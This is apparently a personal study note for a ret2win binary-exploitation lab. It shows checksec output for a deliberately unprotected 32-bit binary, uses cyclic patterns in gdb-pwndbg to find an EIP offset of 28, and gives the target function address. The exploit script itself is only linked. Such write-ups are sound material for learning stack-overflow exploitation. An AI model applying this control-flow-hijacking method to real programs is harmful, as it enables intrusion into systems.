[[Binary Exploitation/03-04 Ret2Win/03/Source Code|Source Code]]

### Basic File checks

1. File -> `ret2win: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5978b724ef3c617522fe2a86c281910b02480b0e, for GNU/Linux 3.2.0, not stripped`
2. checksec ->
```python
[*] '/root/binary_exploitation/03/ret2win'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

### Ghidra and gdb-pwndbg

Looking at the source code it seems that there is a buffer of 16 bytes but we need to overflow the EIP pointer

Let's use gdb-pwndbg to find the offset to the EIP pointer

```python
cyclic 100
gdb-pwndbg ./ret2win
```

Result:

```python
*EAX  0x6f
*EBX  0x61616166 ('faaa')
 ECX  0x0
*EDX  0xf7fc2540 ◂— 0xf7fc2540
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0x8049230 (__libc_csu_init) ◂— push ebp
*EBP  0x61616167 ('gaaa')
*ESP  0xffffcf20 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
*EIP  0x61616168 ('haaa')
```

The Eip pointer has the value `haaa` so to see what byte that is we can use the following command

```python
cyclic -l haaa
```

Result:

```python
Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
Found at offset 28
```

So now that we know the offset we have to find the return address of the hacked function we found in ghidra

the return address is `0x08049182`

Now let's make the automated python script

[[Binary Exploitation/03-04 Ret2Win/03/Python Script|Python Script]] 